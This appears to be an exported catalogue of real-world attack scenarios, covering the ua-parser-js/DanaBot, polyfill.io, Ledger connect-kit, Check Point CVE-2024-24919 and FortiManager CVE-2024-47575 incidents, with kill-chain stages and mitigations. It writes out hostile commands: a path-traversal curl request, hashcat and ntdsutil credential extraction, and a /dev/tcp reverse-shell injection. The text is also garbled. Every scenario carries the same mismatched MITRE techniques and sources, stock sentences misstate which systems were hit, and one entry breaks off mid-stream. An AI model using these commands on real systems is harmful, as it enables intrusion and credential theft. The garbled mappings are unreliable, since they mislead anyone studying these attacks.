  - Stage 3 (T1218.010 · Regsvr32 / T1555): **Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft** — The script hands the downloaded burglar tool to a built-in Windows clerk (regsvr32.exe) with instructions to run silently and empty the developer’s password drawer. The batch file executed regsvr32.exe -s create.dll (abusing the signed Microsoft COM registration utility with the -s silent flag to invoke the DLL’s DllRegisterServer export without displaying error popups), launching the DanaBot information stealer in memory to harvest saved Chrome/Edge browser passwords, session cookies, Windows DPAPI secrets, SSH private keys, and cloud CLI credentials. Because developers frequently hold privileged AWS, GitHub, and production SSH credentials on their laptops, CISA warned that any workstation that installed these versions had to be treated as fully compromised. In the documented EventID 1 exchange from NPM Registry (ua-parser-js / coa / rc) to Developer Workstation (npm install), Developer Workstation (npm install) responds with ACK 1 (confirming that the regsvr32.exe -s create.dll request succeeded on Developer Workstation (npm install) and completing the final execution objective of NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer). On the diagram, follow Step #3 / Link #3 (#3→ regsvr32.exe -s create.dll / ⇠#3 ACK 1) from Node ③ (#3 NPM Registry (ua-parser-js / coa / rc)) to Node ④ (#4 Developer Workstation (npm install)), monitored by Node ⑥ (#6 Browser Session Vault & Cloud Tokens). [Specs: COMMAND 1=regsvr32.exe -s create.dll; COMMAND 2=DanaBot Stealer: Reads %LocalAppData%\Google\Chrome\User Data\Default\Login Data & ~/.aws/credentials; DEFENSE / MITIGATION=Block regsvr32.exe from loading unsigned DLLs located in user-writable project directories or node_modules folders via WDAC/AppLocker rules.; MITRE CONTEXT=Defense Evasion & Credential Access (T1218.010 - Regsvr32 / T1555)]

### T1195.002: cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)
- **Scenario ID**: `polyfill-io-cdn-domain-supply-chain`
- **Canonical URL**: https://attackexplorer.org/scenarios/polyfill-io-cdn-domain-supply-chain
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=polyfill-io-cdn-domain-supply-chain
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.002
- **Overview**: Imagine 100,000 retail stores hiring an outside translator who stands inside their checkout lane to help older customers read the signs. Years later, a syndicate buys the translator agency. Whenever a store manager looks, the translator behaves normally, but whenever a customer walks in on a mobile phone after hours, the translator slips a forged receipt into their bag. For years, web developers embedded <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> to support older browsers. In February 2024, the polyfill.io domain was acquired by a third party (Funnull). By June 2024, Sansec discovered that cdn.polyfill.io was inspecting incoming HTTP headers and conditionally injecting obfuscated malware (www.googie-anaiytics.com/gtags.js) into mobile visitors while serving clean code to desktop admins.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1195.002 · Compromise Software Supply Chain): **Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)** — A website leaves an open window in its checkout page that automatically runs whatever script is handed through by an external domain name. Over 100,000 websites embedded <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without a Subresource Integrity (SRI) hash (integrity="sha384-...", a browser security attribute that verifies the cryptographic hash of a fetched script and refuses to execute it if a single byte changes), partially because polyfill.io was originally designed to return dynamic JS bundles tailored to each browser’s User-Agent. When ownership of the polyfill.io DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still referencing that <script> tag. In the documented WAF exchange from Rogue CDN Operator (cdn.polyfill.io) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1195.002 (confirming that the Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) / ⇠#1 ALERT T1195.002) from Node ① (#1 Rogue CDN Operator (cdn.polyfill.io)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target). [Specs: COMMAND 1=<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> (Missing integrity & crossorigin attributes); DEFENSE / MITIGATION=Eliminate external polyfill CDNs or enforce Subresource Integrity (SRI) hashes (`integrity="sha384-..."`) and strict Content-Security-Policy (`script-src`) directives.; MITRE CONTEXT=Initial Access (T1195.002 - Compromise Software Supply Chain)]
  - Stage 2 (T1027 · Obfuscated Files or Information): **Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation** — The rogue server checks the visitor’s ID at the door: if it sees a security inspector or a desktop computer, it hands out a clean brochure; if it sees a mobile phone in a targeted region, it slips in a hidden detonator. The compromised cdn.polyfill.io server evaluated each request’s HTTP User-Agent, Referer, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile devices (iPhone / Android User-Agents) while returning benign polyfill code to desktop browsers, search engine crawlers, and pages containing admin analytics markers (window.google_analytics_admin, preventing site administrators from reproducing the infection during manual testing). The injected code also wrapped its execution in a 15-second setTimeout delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean. In the documented WAF exchange from Perimeter Firewall & NDR Tap to Enterprise Web Portal (<script src=...), Enterprise Web Portal (<script src=...) responds with ALERT T1027 (confirming that the Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation request succeeded on Enterprise Web Portal (<script src=...) and establishing the runtime state required for Step #3 Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation / ⇠#2 ALERT T1027) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Enterprise Web Portal (<script src=...)), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target). [Specs: COMMAND 1=GET /v2/polyfill.min.js HTTP/2 | User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X); COMMAND 2=CDN Conditional Injection: Checks !window.google_analytics_admin && delayed setTimeout(eval(...), 15000); DEFENSE / MITIGATION=Enable Cloudflare automatic polyfill.io URL rewriting (redirecting to cdnjs.cloudflare.com/polyfill) and monitor client-side CSP violation reports.; MITRE CONTEXT=Defense Evasion (T1027 - Obfuscated Files or Information)]
  - Stage 3 (T1185 · Browser Session Hijacking): **Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection** — Once the script runs inside the customer’s browser tab, it has the exact same authority as the store’s own checkout code. Because a <script src="..."> tag executes directly inside the host page’s Same-Origin Policy (SOP) context (giving third-party scripts full read/write access to the page DOM, localStorage, non-HttpOnly document.cookie values, and window.location), the payload dynamically appended a secondary loader (https://www.googie-anaiytics.com/gtags.js) and hijacked mobile user sessions. To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap cdn.polyfill.io with a clean mirror at cdnjs.cloudflare.com/polyfill, and the domain registrar placed polyfill.io on clientHold. In the documented WAF exchange from Enterprise Web Portal (<script src=...) to End-User Mobile Browser Session, End-User Mobile Browser Session responds with ALERT T1185 (confirming that the Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection request succeeded on End-User Mobile Browser Session and completing the final execution objective of cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)). On the diagram, follow Step #3 / Link #3 (#3→ Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection / ⇠#3 ALERT T1185) from Node ③ (#3 Enterprise Web Portal (<script src=...)) to Node ④ (#4 End-User Mobile Browser Session), monitored by Node ⑥ (#6 DOM Session Context & Redirect Target). [Specs: COMMAND 1=DOM Execution in First-Party Origin: Access to document.cookie, window.localStorage, and location.replace(); DEFENSE / MITIGATION=Deploy Content-Security-Policy (CSP) with strict-dynamic or explicit script hashes and place compromised third-party domains on registrar clientHold.; MITRE CONTEXT=Collection & Impact (T1185 - Browser Session Hijacking)]

### T1195.001: Ledger Connect-Kit NPM Compromise & Web3 WalletConnect Drainer
- **Scenario ID**: `ledger-connect-kit-npmjs-drainer`
- **Canonical URL**: https://attackexplorer.org/scenarios/ledger-connect-kit-npmjs-drainer
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=ledger-connect-kit-npmjs-drainer
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.001
- **Overview**: Imagine a former bank courier who left the company a year ago, but nobody canceled their keycard to the central brochure rack. A scammer tricks the former courier into handing over the keycard, puts counterfeit deposit slips into the rack, and because hundreds of local branches automatically restock from the "latest" slot on the rack every hour, customers at those branches are handed forms that wire their funds to the scammer. In December 2023, a threat actor phished a former Ledger employee whose npmjs account still had publish rights to @ledgerhq/connect-kit. The attacker published versions 1.1.5, 1.1.6, and 1.1.7 containing the Angel Drainer wallet-draining script and a rogue WalletConnect project ID. Because @ledgerhq/connect-kit-loader fetched https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1 without version pinning, hundreds of DeFi dApps immediately served the drainer to users.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1195.001 · Compromise Software Dependencies): **Stage 1: Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7** — A former employee’s badge still works at the publishing house, allowing an impersonator to print three unauthorized editions without going through the editorial board. After spear-phishing a former employee whose npmjs account had not been removed from the @ledgerhq organization during offboarding, the attacker generated an npm access token and published @ledgerhq/connect-kit versions 1.1.5, 1.1.6, and 1.1.7 directly from the CLI (bypassing the official GitHub repository and CI/CD release pipeline entirely). Auditing the npm registry metadata against GitHub showed that versions 1.1.5–1.1.7 had no corresponding Git tags, pull requests, or GitHub Actions release runs in Ledger’s source repository. In the documented Auth exchange from Angel Drainer Operator & Rogue ProjectID to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.001 (confirming that the Stage 1: Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7 request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7 / ⇠#1 ACK T1195.001) from Node ① (#1 Angel Drainer Operator & Rogue ProjectID) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 User Web3 Wallet (Permit2 / SetApprovalForAll)). [Specs: COMMAND 1=npm publish @ledgerhq/connect-kit@1.1.5 (Published directly via compromised npm token bypassing GitHub CI); DEFENSE / MITIGATION=Enforce SSO/SCIM offboarding across package registries (npm, PyPI, Docker Hub) and require OIDC Trusted Publishing tied exclusively to protected GitHub release workflows.; MITRE CONTEXT=Initial Access (T1195.001 - Compromise Software Dependencies)]
  - Stage 2 (T1059.007 · JavaScript): **Stage 2: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader** — Even stores that locked their own front doors had installed an automatic chute that pulled whatever package was labeled "Latest Version 1" straight from the public warehouse into their lobby. Even dApps that pinned their own package-lock.json were impacted because @ledgerhq/connect-kit-loader was designed to dynamically load <script src="https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js"> at runtime in the user’s browser (using the floating major version tag @1, which caused jsDelivr’s CDN to automatically resolve and serve the newly published 1.1.7 bundle within minutes). This design bypassed build-time dependency pinning completely: every time a user loaded a dApp frontend in their browser, the browser fetched the latest 1.x build directly from cdn.jsdelivr.net. In the documented WAF exchange from Perimeter Firewall & NDR Tap to NPM & jsDelivr CDN (@ledgerhq/connect-kit), NPM & jsDelivr CDN (@ledgerhq/connect-kit) responds with ALERT T1059.007 (confirming that the Stage 2: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader request succeeded on NPM & jsDelivr CDN (@ledgerhq/connect-kit) and establishing the runtime state required for Step #3 Stage 3: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader / ⇠#2 ALERT T1059.007) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 NPM & jsDelivr CDN (@ledgerhq/connect-kit)), monitored by Node ⑥ (#6 User Web3 Wallet (Permit2 / SetApprovalForAll)). [Specs: COMMAND 1=GET https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js (Resolves to 1.1.7); COMMAND 2=Injected Rogue WalletConnect ProjectID: 89618723618723...; DEFENSE / MITIGATION=Never dynamically load unpinned major-version scripts (`@1`) from public CDNs at runtime; bundle dependencies at build time with locked SHA-512 integrity hashes in package-lock.json.; MITRE CONTEXT=Execution (T1059.007 - JavaScript)]
  - Stage 3 (T1657 · Financial Theft): **Stage 3: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain** — While the customer thinks they are simply signing in at the reception desk, the counterfeit screen asks them to sign a power-of-attorney form giving the thief permission to empty their vault. The injected Angel Drainer payload rendered a fake WalletConnect connection modal using an attacker-controlled WalletConnect Project ID, scanned the connected wallet’s token balances, and prompted the user to sign EIP-712 Permit2 off-chain messages or setApprovalForAll transactions (cryptographic token allowances that grant the attacker’s drainer smart contract permission to transfer the user’s ERC-20 tokens and NFTs without further confirmation). Ledger hardware wallets themselves remained secure, but users who blindly approved the malicious transaction prompt on their wallet screen authorized the transfer; Ledger and WalletConnect contained the incident within hours by revoking the rogue WalletConnect Project ID, purging jsDelivr’s cache, and shipping pinned v1.1.8. In the documented WAF exchange from NPM & jsDelivr CDN (@ledgerhq/connect-kit) to Downstream Web3 dApp Frontend, Downstream Web3 dApp Frontend responds with ALERT T1657 (confirming that the Stage 3: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain request succeeded on Downstream Web3 dApp Frontend and completing the final execution objective of Ledger Connect-Kit NPM Compromise & Web3 WalletConnect Drainer). On the diagram, follow Step #3 / Link #3 (#3→ Stage 3: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain / ⇠#3 ALERT T1657) from Node ③ (#3 NPM & jsDelivr CDN (@ledgerhq/connect-kit)) to Node ④ (#4 Downstream Web3 dApp Frontend), monitored by Node ⑥ (#6 User Web3 Wallet (Permit2 / SetApprovalForAll)). [Specs: COMMAND 1=eth_signTypedData_v4 (EIP-712 Permit2 batch allowance to Angel Drainer contract 0x0000...); COMMAND 2=WalletConnect Relay Revocation: WalletConnect blocks rogue ProjectID & jsDelivr purges CDN cache for v1.1.5-1.1.7; DEFENSE / MITIGATION=Integrate real-time transaction simulation (e.g., Blockaid) inside wallet interfaces to warn users before signing Permit2 or setApprovalForAll calls to untrusted spender contracts.; MITRE CONTEXT=Impact (T1657 - Financial Theft)]

### T1190: Check Point Security Gateway /clients/MyCRL Path Traversal & AD Compromise (CVE-2024-24919)
- **Scenario ID**: `check-point-vpn-cve-2024-24919-info-leak`
- **Canonical URL**: https://attackexplorer.org/scenarios/check-point-vpn-cve-2024-24919-info-leak
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=check-point-vpn-cve-2024-24919-info-leak
- **Category**: ZERO_DAY_APPLIANCES | **Severity**: CRITICAL
- **Subtitle**: Zero-Day Appliances · T1190
- **Overview**: Imagine a public pamphlet window at the front of a fortress where visitors can ask for a specific brochure by name. If a visitor asks for "../../../../MasterKeyBook", the clerk, who happens to carry the king’s master ring, walks out of the pamphlet closet, straight into the royal vault, and hands the Master Key Book through the window. In May 2024, Check Point disclosed CVE-2024-24919 after Mnemonic and watchTowr Labs investigated active zero-day intrusions. On Check Point Security Gateways with Remote Access VPN or Mobile Access enabled, sending a crafted POST request to /clients/MyCRL containing aCSHELL/../../../../../../../etc/shadow allowed unauthenticated attackers to read any root-accessible file on the appliance, crack local VPN accounts, extract Active Directory LDAP bind credentials from objects_5_0.C, and dump ntds.dit.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **Stage 1: Unauthenticated Path Traversal POST Request to /clients/MyCRL (CVE-2024-24919)** — A visitor writes "../" seven times on a brochure request slip, tricking the automated retrieval arm into reaching outside the public folder and into the private safe. The attacker sent an unauthenticated HTTP POST request to /clients/MyCRL with body aCSHELL/../../../../../../../etc/shadow. Inside the Check Point vpnd daemon, the /clients/MyCRL handler stripped the initial prefix and passed the remaining POST body directly to fopen() as root (failing to canonicalize the path or strip ../ directory traversal sequences), returning the raw contents of any file on the Gaia OS filesystem in the HTTP 200 response. watchTowr Labs demonstrated through binary diffing that the patch added an explicit substring check rejecting requests containing .. or / inside the /clients/MyCRL handler. In the documented WAF exchange from External Threat Actor (POST /clients/MyCRL) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1190 (confirming that the Stage 1: Unauthenticated Path Traversal POST Request to /clients/MyCRL (CVE-2024-24919) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Unauthenticated Path Traversal POST Request to /clients/MyCRL (CVE-2024-24919) / ⇠#1 ALERT T1190) from Node ① (#1 External Threat Actor (POST /clients/MyCRL)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Active Directory DC (ntds.dit Extraction)). [Specs: COMMAND 1=POST /clients/MyCRL HTTP/1.1; COMMAND 2=Body: aCSHELL/../../../../../../../etc/shadow; DEFENSE / MITIGATION=Apply Check Point Security Gateway hotfix for CVE-2024-24919 immediately, disable unused Mobile Access / Remote Access VPN blades, and enforce MFA on all VPN accounts.; MITRE CONTEXT=Initial Access (T1190 - Exploit Public-Facing Application)]
  - Stage 2 (T1552.001 · Credentials In Files): **Stage 2: Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials** — Once the thief realizes the clerk will fetch any book in the building, they ask for the local guard roster, the SSH key ring, and the firewall’s address book containing the corporate directory password. Using the arbitrary file-read primitive, the attacker downloaded /etc/shadow (containing password hashes for local gateway accounts and legacy password-only VPN test users), /home/admin/.ssh/id_rsa, and Check Point’s internal database files $FWDIR/conf/objects_5_0.C and $FWDIR/database/fwauth.NDB (configuration files that store the Active Directory LDAP integration bind account username and reversible/obfuscated password used by the firewall to query domain groups). Even if all human employees used MFA for VPN logins, organizations frequently had a forgotten local "test" or vendor VPN user configured with password-only authentication in fwauth.NDB or an over-privileged AD LDAP bind account in objects_5_0.C. In the documented WAF exchange from Perimeter Firewall & NDR Tap to Check Point Gateway (vpnd root daemon), Check Point Gateway (vpnd root daemon) responds with ALERT T1552.001 (confirming that the Stage 2: Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials request succeeded on Check Point Gateway (vpnd root daemon) and establishing the runtime state required for Step #3 Stage 3: VPN Tunnel Establishment & Active Directory ntds.dit Extraction). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials / ⇠#2 ALERT T1552.001) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Check Point Gateway (vpnd root daemon)), monitored by Node ⑥ (#6 Active Directory DC (ntds.dit Extraction)). [Specs: COMMAND 1=curl -sk -X POST https://vpn.corp.example/clients/MyCRL -d "aCSHELL/../../../../../../../opt/CPsuite-R81.20/fw1/conf/objects_5_0.C"; COMMAND 2=hashcat -m 1800 shadow.hashes wordlist.txt (Cracks local VPN user password); DEFENSE / MITIGATION=Remove legacy local password-only VPN user definitions and rotate the Active Directory LDAP bind service account password stored on the firewall.; MITRE CONTEXT=Credential Access (T1552.001 - Credentials In Files)]
  - Stage 3 (T1003.003 · NTDS): **Stage 3: VPN Tunnel Establishment & Active Directory ntds.dit Extraction** — With the local gate key and the over-privileged directory service badge in hand, the thief walks through the VPN tunnel and copies the entire company identity database in under two hours. Mnemonic incident responders observed threat actors logging into the Check Point VPN using cracked local credentials and then authenticating to the internal Domain Controller with the stolen svc_cp_ldap Active Directory account (which had erroneously been granted Domain Admin or Backup Operators rights), executing ntdsutil "ac i ntds" "ifm" "create full C:\Temp\AD" (the Install From Media feature that creates a Volume Shadow Copy snapshot and extracts ntds.dit and the SYSTEM registry hive for offline hash cracking). In documented incidents, the entire kill chain from initial /clients/MyCRL file read to full ntds.dit Active Directory compromise completed in less than three hours. On the diagram, follow Step #3 / Link #3 (#3→ ntdsutil "ac i ntds" "ifm" "create full C:\Temp\AD" q q / ⇠#3 ACK 1) from Node ③ (#3 Check Point Gateway (vpnd root daemon)) to Node ④ (#4 Gateway Filesystem (/etc/shadow & objects_5_0.C)), monitored by Node ⑥ (#6 Active Directory DC (ntds.dit Extraction)). ### T1190: SonicWall SonicOS SSLVPN Access Control Bypass & Akira/Fog Ransomware (CVE-2024-40766)
- **Scenario ID**: `sonicwall-sslvpn-cve-2024-40766-akira`
- **Canonical URL**: https://attackexplorer.org/scenarios/sonicwall-sslvpn-cve-2024-40766-akira

- **Overview**: Imagine a building upgrades from an old lock system to a brand-new digital gate, but copies over the old master guest list, and the new digital gate has a wiring bug that lets anyone bypass the guard booth. Ransomware crews slip through the gate, use built-in building intercoms (WMI) to walk into every room, smash the backup mirrors, and lock the doors. Disclosed in August 2024 (SNWLID-2024-0015), CVE-2024-40766 is a CVSS 9.3 improper access control flaw in SonicWall SonicOS SSLVPN across Gen 5, Gen 6, and Gen 7 firewalls. ### T1190: FortiManager fgfmsd Unauthenticated API RCE ("FortiJump" CVE-2024-47575 / UNC5820)
- **Scenario ID**: `fortimanager-fgd-jump-cve-2024-47575`
- **Canonical URL**: https://attackexplorer.org/scenarios/fortimanager-fgd-jump-cve-2024-47575
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=fortimanager-fgd-jump-cve-2024-47575
- **Category**: ZERO_DAY_APPLIANCES | **Severity**: CRITICAL
- **Subtitle**: Zero-Day Appliances · T1190
- **Overview**: Imagine the central headquarters that manages 500 branch bank vaults. Headquarters has a dedicated phone line (Port 541) meant only for branch vaults calling in to sync their combinations. Due to a flaw, headquarters checks that the caller has a laminated ID card, but never checks if the serial number on the card actually belongs to the bank. A thief calls in with a fake serial number, gets patched straight through to the master archive clerk (rcs_checkout), and downloads the combinations to all 500 branch vaults. Tracked by Mandiant as UNC5820 beginning in June 2024 and disclosed by Fortinet in October 2024 (FG-IR-24-423), CVE-2024-47575 ("FortiJump", CVSS 9.8) is a missing authentication vulnerability in the FortiGate-to-FortiManager (fgfmsd) protocol on TCP port 541. By presenting a self-signed or arbitrary certificate and registering an unknown serial number, an unauthenticated attacker reaches internal API handlers like rcs_checkout, injects shell commands as root, and steals /var/fwclient containing the configurations and password hashes of every managed FortiGate.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **Stage 1: Unauthenticated FGFM TLS Handshake & Rogue Device Registration (TCP/541)** — A stranger walks up to the branch-office check-in window, flashes a self-printed badge with a made-up branch number, and the system automatically registers them as an active branch. UNC5820 connected to TCP port 541 on internet-facing FortiManager appliances, completed a mutual TLS handshake using an arbitrary/self-signed certificate, and transmitted an FGFM request=get packet with channel=ip and a spoofed device serial number (serial=FGVM02TM...). Because fgfmsd did not verify whether the serial number was pre-authorized before instantiating a device session (CVE-2024-47575), the daemon registered the rogue device and opened the authenticated RPC command dispatcher (FortiManager’s default setting fgfm-deny-unknown disable allowed unknown FortiGate serial numbers to register dynamically in the Unregistered Devices table and immediately invoke internal FGFM protocol channels). FortiManager’s default setting (fgfm-deny-unknown disable) allowed unknown FortiGate serial numbers to register dynamically in the Unregistered Devices table and immediately invoke internal FGFM protocol channels. On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Unauthenticated FGFM TLS Handshake & Rogue Device Registration (TCP/541) / ⇠#1 ACK T1190) from Node ① (#1 UNC5820 Rogue FGFM Client (TCP/541)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Managed FortiGate Fleet Configs & Hashes). [Specs: COMMAND 1=TLS Handshake to TCP/541 (fgfmsd accepts arbitrary client certificate CN); COMMAND 2=FGFM Request: request=get\nchannel=ip\nserial=FGVM02TM23009999; DEFENSE / MITIGATION=Enable `set fgfm-deny-unknown enable` under `config system global` on FortiManager, upgrade to patched firmware, and restrict TCP port 541 to known FortiGate WAN IPs.; MITRE CONTEXT=Initial Access (T1190 - Exploit Public-Facing Application)]
  - Stage 2 (T1059.004 · Unix Shell): **Stage 2: FGFM put_json / rcs_checkout Command Injection as Root** — Now that the system treats the stranger as a registered branch, the stranger sends a file check-out request with a shell command hidden inside the filename. Through the established FGFM session, the attacker sent an action=put_json message invoking the internal revision control method rcs_checkout (a backend handler in fgfmsd that passes the JSON "file" parameter directly into /bin/sh -c "/usr/bin/rcs -l ..." without shell escaping), executing arbitrary OS commands on the FortiManager appliance with root privileges. Rapid7 and Mandiant documented how put_json requests routed through umath_handler to rcs_checkout allowed immediate non-interactive command execution or interactive reverse shells over TLS. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to FortiManager Daemon (fgfmsd Port 541), FortiManager Daemon (fgfmsd Port 541) responds with ALERT 1 (confirming that the /bin/sh -c /usr/bin/rcs -l "1; tar -czf /tmp/.tm.tar.gz /var/fwclient/* #" request succeeded on FortiManager Daemon (fgfmsd Port 541) and establishing the runtime state required for Step #3 Stage 3: Exfiltration of Managed FortiGate Configurations (/var/fwclient & globaldb)). On the diagram, follow Step #2 / Link #2 (#2→ /bin/sh -c /usr/bin/rcs -l "1; tar -czf /tmp/.tm.tar.gz /var/fwclient/* #" / ⇠#2 ALERT 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 FortiManager Daemon (fgfmsd Port 541)), monitored by Node ⑥ (#6 Managed FortiGate Fleet Configs & Hashes). [Specs: COMMAND 1=FGFM Request: action=put_json -> method=rcs_checkout; COMMAND 2=Injected Parameter: "file": "1; sh -i >& /dev/tcp/195.85.114.78/443 0>&1 #"; DEFENSE / MITIGATION=Monitor FortiManager system logs for unexpected `Unregistered device` entries with `hostname="localhost"` and audit `/var/tmp` or `/tmp` for staged archives.; MITRE CONTEXT=Execution (T1059.004 - Unix Shell)]
